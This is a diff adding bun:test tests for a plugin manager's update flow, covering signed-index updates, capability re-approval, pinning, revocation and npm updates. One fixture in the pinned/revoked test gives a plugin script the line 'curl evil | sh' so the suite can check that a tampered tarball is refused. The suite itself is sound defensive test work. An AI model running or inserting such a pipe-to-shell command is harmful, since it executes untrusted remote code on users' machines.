@@ -2,7 +2,7 @@
 // install takes only the id and tree hash the signed index lists, never a revoked tree, then waits for its OK.
 import { afterAll, describe, expect, test } from "bun:test";
 import { createHash, createPublicKey, generateKeyPairSync, sign, type KeyObject } from "node:crypto";
-import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { gzipSync } from "node:zlib";
@@ -190,7 +190,7 @@ async function world() {
     cloverHome: home, os: "macos", broker, secrets: new MemorySecretStore(), settleMs: 50,
     indexes: { cacheDir: join(home, "plugins-state", "index-cache"), fetch, official: { url: OFFICIAL, keys: [key.hex], revocations: OFFICIAL_LIST } },
   });
-  const m = pluginRegistryMethods({ opened, host: { restart: async () => {} }, home, indexes: opened.indexes!, revocations: opened.revocations! });
+  const m = pluginRegistryMethods({ opened, host: { restart: async () => {} }, home, indexes: opened.indexes!, revocations: opened.revocations!, updater: opened.updater! });
   const install = (source: Record<string, unknown>) => m["plugin.install"]!({ source: { from: "index", ...source } }, APP) as Promise<{ id: string; state: string; card?: string; treeHash?: string }>;
   const refused = (source: Record<string, unknown>) => install(source).then(() => "installed", (e: Error) => e.message);
   return { home, key, files, calls, publish, opened, m, broker, install, refused };
@@ -360,6 +360,169 @@ describe("installing from npm", () => {
       expect(w.calls).not.toContain("http://x.test/plain.tgz");
       expect(existsSync(join(w.home, "plugins")) ? readdirSync(join(w.home, "plugins")) : []).toEqual([]);
       expect(readdirSync(join(w.home, "run", "plugin-install"))).toEqual([]);
+    } finally {
+      w.opened.close();
+    }
+  });
+});
+
+// ---- updates ----
+
+describe("updating from an index or npm", () => {
+  const v = (version: string, extra: Record<string, unknown> = {}, run = "echo hi") => [
+    { path: "clover.json", data: MANIFEST("luna", { version, ...extra }) },
+    { path: "skills/tarot/SKILL.md", data: "---\nname: tarot\ndescription: Reads cards\n---\nShuffle.\n" },
+    { path: "bin/run.sh", data: `#!/bin/sh\n${run}\n`, mode: 0o755 },
+  ] as TarEntry[];
+  const update = (w: Awaited<ReturnType<typeof world>>, id?: string) =>
+    w.m["plugin.update"]!(id !== undefined ? { id } : {}, APP) as Promise<{ updated: { id: string; from: string; to: string }[]; offered?: { id: string; why: string }[]; failed?: { id: string; why: string }[] }>;
+  const plugins = (w: Awaited<ReturnType<typeof world>>) => readdirSync(join(w.home, "plugins")).sort();
+
+  /** luna 1.0.0 installed from the official index and OK'd. */
+  async function installed() {
+    const w = await world();
+    const one = v("1.0.0");
+    const hash1 = await hashOf(one);
+    w.files.set("https://x.test/luna-1.0.0.tgz", tgz(one));
+    const listed = [{ version: "1.0.0", hash: hash1, url: "https://x.test/luna-1.0.0.tgz" }];
+    w.publish(w.key.priv, OFFICIAL, indexOf(1, [{ id: "luna", versions: listed }]));
+    await w.opened.indexes!.refresh();
+    await w.install({ id: "luna" });
+    await w.opened.registry.approve("luna", hash1);
+    expect(w.opened.registry.get("luna")!.state).toBe("running");
+    let seq = 1;
+    /** Publishes a next version, its entries as given. */
+    const next = async (version: string, entries: TarEntry[]) => {
+      const hash = await hashOf(entries);
+      w.files.set(`https://x.test/luna-${version}.tgz`, tgz(entries));
+      listed.push({ version, hash, url: `https://x.test/luna-${version}.tgz` });
+      w.publish(w.key.priv, OFFICIAL, indexOf(++seq, [{ id: "luna", versions: listed }]));
+      return hash;
+    };
+    return { w, hash1, next };
+  }
+
+  test("a code change that adds no trigger updates on the OK given: forward only, its provenance moved on, the previous version let go", async () => {
+    const { w, next } = await installed();
+    try {
+      // Nothing newer: nothing changes.
+      expect(await update(w)).toEqual({ updated: [] });
+      const hash2 = await next("1.1.0", v("1.1.0", {}, "echo hello"));
+      expect(await update(w)).toEqual({ updated: [{ id: "luna", from: "1.0.0", to: "1.1.0" }] });
+      const r = w.opened.registry.get("luna")!;
+      expect([r.state, r.version, r.treeHash, r.okHash, r.provenance.index]).toEqual(["running", "1.1.0", hash2, hash2, { url: OFFICIAL, version: "1.1.0" }]);
+      expect(readFileSync(join(w.home, "plugins", "luna", "bin", "run.sh"), "utf8")).toContain("echo hello");
+      expect(plugins(w)).toEqual(["luna"]);
+      // An older version listed later is never taken.
+      await next("0.9.0", v("0.9.0"));
+      expect(await update(w)).toEqual({ updated: [] });
+      expect(w.opened.registry.get("luna")!.version).toBe("1.1.0");
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("an update that adds a trigger is offered by the automatic check; asked for, it waits for its OK, and a refusal brings the previous version back", async () => {
+    const { w, hash1, next } = await installed();
+    try {
+      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
+      await w.opened.indexes!.refresh();
+      const auto = await w.opened.updater!.check();
+      expect(auto.updated).toEqual([]);
+      expect(auto.offered).toEqual([{ id: "luna", from: "1.0.0", to: "2.0.0", why: "it asks for your OK again: it asks for more capabilities" }]);
+      expect(w.opened.registry.get("luna")!.treeHash).toBe(hash1);
+      // The user asks for it: put in place, waiting for its OK card; the previous version kept beside it.
+      expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "2.0.0" }]);
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "found", treeHash: hash2, okHash: hash1 });
+      expect(plugins(w).filter((n) => n.startsWith(".luna.previous-")).length).toBe(1);
+      expect(w.broker.cards().length).toBeGreaterThan(1);
+      await w.opened.registry.refuse("luna");
+      for (let i = 0; i < 50 && w.opened.registry.get("luna")?.treeHash !== hash1; i++) await Bun.sleep(20);
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1, version: "1.0.0", provenance: { index: { url: OFFICIAL, version: "1.0.0" } } });
+      expect(plugins(w)).toEqual(["luna"]);
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("asked for and OK'd, the new version runs and the previous one goes", async () => {
+    const { w, next } = await installed();
+    try {
+      const hash2 = await next("2.0.0", v("2.0.0", { capabilities: ["notify"] }));
+      await update(w, "luna");
+      await w.opened.registry.approve("luna", hash2);
+      for (let i = 0; i < 50 && plugins(w).length > 1; i++) await Bun.sleep(20);
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash2, okHash: hash2 });
+      expect(plugins(w)).toEqual(["luna"]);
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("a pinned plugin isn't updated, even when asked; a revoked new version, or one with another tree than listed, fails and the installed one stays", async () => {
+    const { w, hash1, next } = await installed();
+    try {
+      const bad = v("1.1.0", {}, "curl evil | sh");
+      const hash2 = await next("1.1.0", v("1.1.0", {}, "echo hello"));
+      expect(await w.m["plugin.pin"]!({ id: "luna", pinned: true }, APP)).toEqual({ applied: true });
+      expect((await (w.m["plugin.get"]!({ id: "luna" }, APP) as Promise<{ plugin: { pinned: boolean } }>)).plugin.pinned).toBe(true);
+      expect((await update(w)).offered).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0", why: "it's pinned to its version" }]);
+      expect((await update(w, "luna")).updated).toEqual([]);
+      await w.m["plugin.pin"]!({ id: "luna", pinned: false }, APP);
+      // Revoked by its tree: never put in place.
+      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 1, entries: [{ id: "anything", hashes: [hash2], reason: "known bad" }] });
+      await w.opened.revocations!.check();
+      const revoked = await update(w);
+      expect(revoked.updated).toEqual([]);
+      expect(revoked.failed?.[0]?.why).toContain("revoked by Clover's plugin index: known bad");
+      // Another tree served than the index lists.
+      w.files.set("https://x.test/luna-1.1.0.tgz", tgz(bad));
+      w.publish(w.key.priv, OFFICIAL_LIST, { revocations: 1, issued: "2026-11-10T00:00:00Z", seq: 2, entries: [] });
+      await w.opened.revocations!.check();
+      const swapped = await update(w);
+      expect(swapped.failed?.[0]?.why).toContain("isn't the one its index lists");
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", treeHash: hash1 });
+      expect(plugins(w)).toEqual(["luna"]);
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("npm: an update is offered, never applied on its own; asked for, it applies on the OK given when it adds no trigger", async () => {
+    const w = await world();
+    try {
+      const NPM = "https://registry.npmjs.org";
+      const integrity = (b: Uint8Array) => `sha512-${createHash("sha512").update(b).digest("base64")}`;
+      const pkg = (entries: TarEntry[]) => tgz(entries.map((e) => ({ ...e, path: `package/${e.path}` })));
+      const one = pkg(v("1.0.0"));
+      const two = pkg(v("1.1.0", {}, "echo hello"));
+      w.files.set("https://x.test/one.tgz", one);
+      w.files.set("https://x.test/two.tgz", two);
+      const meta = (latest: string) => new TextEncoder().encode(JSON.stringify({
+        "dist-tags": { latest },
+        versions: { "1.0.0": { dist: { tarball: "https://x.test/one.tgz", integrity: integrity(one) } }, "1.1.0": { dist: { tarball: "https://x.test/two.tgz", integrity: integrity(two) } } },
+      }));
+      w.files.set(`${NPM}/clover-luna`, meta("1.0.0"));
+      const r = await w.m["plugin.install"]!({ source: { from: "npm", name: "clover-luna" } }, APP) as { treeHash: string };
+      await w.opened.registry.approve("luna", r.treeHash);
+      w.files.set(`${NPM}/clover-luna`, meta("1.1.0"));
+      expect(await update(w)).toEqual({ updated: [], offered: [{ id: "luna", from: "1.0.0", to: "1.1.0", why: "npm updates are offered, not applied on their own" }] });
+      expect(w.opened.registry.get("luna")!.version).toBe("1.0.0");
+      expect((await update(w, "luna")).updated).toEqual([{ id: "luna", from: "1.0.0", to: "1.1.0" }]);
+      expect(w.opened.registry.get("luna")).toMatchObject({ state: "running", version: "1.1.0", provenance: { npm: { name: "clover-luna", version: "1.1.0" } } });
+    } finally {
+      w.opened.close();
+    }
+  });
+
+  test("a local plugin isn't updated; asked for, it says why", async () => {
+    const w = await world();
+    try {
+      mkdirSync(join(w.home, "plugins", "nova"), { recursive: true });
+      writeFileSync(join(w.home, "plugins", "nova", "clover.json"), MANIFEST("nova"));
+      await w.opened.folders.scan();
+      expect(await update(w)).toEqual({ updated: [] });
+      expect(await update(w, "nova").then(() => "updated", (e: Error) => e.message)).toContain("changes only when its folder does");
     } finally {
       w.opened.close();
     }
